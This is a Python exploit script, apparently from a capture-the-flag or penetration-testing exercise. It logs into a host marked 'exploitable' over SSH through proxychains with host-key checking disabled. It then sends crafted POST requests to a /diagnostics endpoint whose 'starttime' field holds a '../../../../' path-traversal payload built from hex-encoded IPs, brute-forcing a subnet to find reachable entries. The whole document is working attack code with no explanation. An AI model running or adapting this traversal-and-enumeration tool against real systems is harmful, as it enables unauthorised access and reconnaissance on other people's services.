from concurrent.futures import ThreadPoolExecutor
import subprocess
import json
import ipaddress
import pexpect
# user name for ssh login
username = "nonroot_user"
# exploitable IP address
server_ip = "100.80.144.142"
# subnets to parse
subnet = "100.64.0.0/12"

max_threads = 10


def ip_to_hex(ip):
    return ''.join('{:02X}'.format(int(octet)) for octet in ip.split('.'))

# The function to execute for each IP
def check_ip():
    ip_found = 0
    task_complete = open("task.txt", "w")
    hex_ip_list = [ip_to_hex(str(ip)) for ip in ipaddress.ip_network(subnet)]
    cmd = f"sudo proxychains4 ssh -i private_key -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no {username}@{server_ip}"
    child = pexpect.spawn(cmd, timeout=10)
    password = child.expect("Password:")
    sudo_password = ""
    if password == 0:
            child.sendline(sudo_password)
            time = child.expect("timer")
            if time == 0: 
                for ip in hex_ip_list:
                    if ip_found > 1:
                        print("DONE")
                        return
                    hex_path = f"../../../../{ip[:2]}/{ip[2:4]}/{ip[4:6]}/{ip[6:]}/."

                    data = {
                            "command_response": {
                                "starttime": hex_path,
                                "endtime": "2023-10-09T17:13:41.2260Z"
                            }
                        }

                    j_dump = json.dumps(data)
                    content_length = len(j_dump)

                    header = f'POST /diagnostics HTTP/1.1\nContent-length: {content_length+1}\n\n'
                    full = f'{header}{j_dump}'
                    child.sendline(full)
                    response = child.expect(['no such','closed','permission denied'])
                    if response == 0:
                        print(f"no such file for IP: {ip}")
                    elif response == 1:
                         print("connection closed")
                    else:
                         print(f"FOUND AN IP: {ip}")
                         task_complete.write(str(ip))
                         ip_found += 1


check_ip()
